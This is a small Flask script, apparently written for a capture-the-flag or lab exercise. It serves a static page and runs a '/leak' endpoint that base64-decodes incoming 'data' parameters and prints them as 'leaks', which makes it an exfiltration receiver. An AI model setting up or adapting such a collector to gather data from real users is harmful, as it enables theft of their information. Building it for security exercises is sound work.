from flask import Flask, request
import base64

app = Flask(__name__, static_folder="static", static_url_path="")

@app.route("/")
def index():
    return app.send_static_file("index.html")   

@app.route("/leak")
def leak():
    data = request.args.get("data")
    if data:
        print(f"[+] Got leaks: {base64.b64decode(data)}")
        

    return "noted."

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)